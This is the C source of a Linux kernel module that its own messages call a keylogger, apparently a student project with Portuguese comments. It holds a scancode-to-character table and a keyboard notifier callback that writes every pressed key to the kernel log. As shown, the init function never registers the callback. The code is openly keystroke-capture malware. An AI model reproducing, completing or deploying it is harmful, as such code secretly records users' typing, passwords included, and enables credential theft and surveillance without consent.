#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/init.h>
#include <linux/kernel.h>   
#include <linux/proc_fs.h> 
#include <linux/fs.h>
#include <linux/keyboard.h>
#include <linux/debugfs.h>
#include <linux/input.h>

#define final_key 126

MODULE_LICENSE("Dual BSD/GPL");
MODULE_AUTHOR("Luis Otavio O.C, Pedro P.");
 

// mapeando as teclas do teclado de acordo com scancode
static const char *teclado[][2] = {
	{"\0", "\0"}, 						//0
	{"_ESC_", "_ESC_"}, 
	{"1", "!"}, 
	{"2", "@"},       
	{"3", "#"}, 
	{"4", "$"}, 
	{"5", "%"}, 
	{"6", "¨"},                 
	{"7", "&"}, 
	{"8", "*"}, 
	{"9", "("}, 						//10
	{"0", ")"},                 
	{"-", "_"}, 
	{"=", "+"}, 
	{"_BACKSPACE_", "_BACKSPACE_"},         
	{"_TAB_", "_TAB_"}, 
	{"q", "Q"}, 
	{"w", "W"}, 
	{"e", "E"}, 
	{"r", "R"},
	{"t", "T"}, 						//20
	{"y", "Y"}, 
	{"u", "U"}, 
	{"i", "I"},                 
	{"o", "O"}, 
	{"p", "P"},
	{"´", "`"}, 
	{"[", "{"},                  
	{"\n", "\n"}, 
	{"_LCTRL_", "_LCTRL_"}, 
	{"a", "A"}, 						//30
	{"s", "S"},   
	{"d", "D"}, 
	{"f", "F"}, 
	{"g", "G"}, 
	{"h", "H"},                 
	{"j", "J"}, 
	{"k", "K"}, 
	{"l", "L"}, 
	{"ç", "Ç"},                 
	{"~", "^"}, 						//40
	{"'", "\""}, 
	{"_LSHIFT_", "_LSHIFT_"}, 
	{"]", "}"}, 
	{"z", "Z"}, 
	{"x", "X"}, 
	{"c", "C"}, 
	{"v", "V"},                 
	{"b", "B"}, 
	{"n", "N"}, 
	{"m", "M"}, 						//50
	{",", "<"},                 
	{".", ">"}, 
	{";", ":"}, 
	{"_RSHIFT_", "_RSHIFT_"}, 
	{"_KPD*_", "_KPD*_"},
	{"_LALT_", "_LALT_"}, 
	{" ", " "}, 
	{"_CAPS_", "_CAPS_"}, 
	{"F1", "F1"},
	{"F2", "F2"}, 						//60
	{"F3", "F3"}, 
	{"F4", "F4"}, 
	{"F5", "F5"},         
	{"F6", "F6"}, 
	{"F7", "F7"}, 
	{"F8", "F8"}, 
	{"F9", "F9"},         
	{"F10", "F10"}, 
	{"_NUM_", "_NUM_"}, 
	{"_SCROLL_", "_SCROLL_"},   		//70
	{"_KPD7_", "_HOME_"}, 
	{"_KPD8_", "_UP_"}, 
	{"_KPD9_", "_PGUP_"}, 
	{"-", "-"}, 
	{"_KPD4_", "_LEFT_"}, 
	{"_KPD5_", "_KPD5_"},         
	{"_KPD6_", "_RIGHT_"}, 
	{"+", "+"}, 
	{"_KPD1_", "_END_"},         
	{"_KPD2_", "_DOWN_"}, 				//80
	{"_KPD3_", "_PGDN"}, 
	{"_KPD0_", "_INS_"}, 
	{"_KPD._", "_DEL_"}, 
	{"_PRTSCR_", "_PRTSCR_"}, 
	{"\0", "\0"},      
	{"\\", "|"}, 
	{"F11", "F11"}, 
	{"F12", "F12"}, 
	{"\0", "\0"},     
	{"\0", "\0"}, 						//90
	{"\0", "\0"}, 
	{"\0", "\0"}, 
	{"\0", "\0"}, 
	{"\0", "\0"},
	{"\0", "\0"}, 
	{"_KPENTER_", "_KPENTER_"}, 
	{"_RCTRL_", "_RCTRL_"}, 
	{"/", "/"},
	{"_PRTSCR_", "_PRTSCR_"}, 
	{"_RALT_", "_RALT_"}, 				//100
	{"\0", "\0"},   
	{"_HOME_", "_HOME_"}, 
	{"_UP_", "_UP_"}, 
	{"_PGUP_", "_PGUP_"},   
	{"_LEFT_", "_LEFT_"}, 
	{"_RIGHT_", "_RIGHT_"}, 
	{"_END_", "_END_"},
	{"_DOWN_", "_DOWN_"}, 
	{"_PGDN", "_PGDN"}, 
	{"_INS_", "_INS_"},   				//110
	{"_DEL_", "_DEL_"}, 
	{"\0", "\0"}, 
	{"\0", "\0"}, 
	{"\0", "\0"},   
	{"/", "?"}, 
	{"\0", "\0"}, 
	{"\0", "\0"}, 
	{"\0", "\0"},         
	{"_PAUSE_", "_PAUSE_"},           	         
	{"\0", "\0"},						//120
	{"\0", "\0"},
	{"\0", "\0"},
	{"\0", "\0"},
	{"\0", "\0"},
	{"\0", "\0"},
	{".", "."}              
};

// converter o código da tecla para uma string
void converte_code(int keycode, int shift_mask)
{
	if (keycode > KEY_RESERVED && keycode <= final_key) {
		const char *tecla = teclado[keycode][shift_mask]; //pegando a tecla na posição da matriz, se está com shift ativado ou não
		printk(KERN_INFO "%s\n", tecla); //escrevendo a tecla digitada
	}
}

// função para chamar o tradutor de tecla
int callback(struct notifier_block *nblock, unsigned long code, void *_param)
{
	struct keyboard_notifier_param *param = _param;

	// executar somente quando uma tecla for pressionada e o código vier como inteiro
	if (param->down && code == KBD_KEYCODE){
		converte_code(param->value, param->shift);
	}
	
	return NOTIFY_OK;
}

//definindo função a ser chamada quando houver uma notificação
static struct notifier_block notificador =
{
    .notifier_call = callback
};

static int __init simple_init(void)
{
	printk(KERN_ALERT "Inicializando o keylogger\n");
	return 0;
}
 
static void __exit simple_cleanup(void)
{
	printk(KERN_WARNING "Finalizando o keylogger\n");
}
 
module_init(simple_init);
module_exit(simple_cleanup);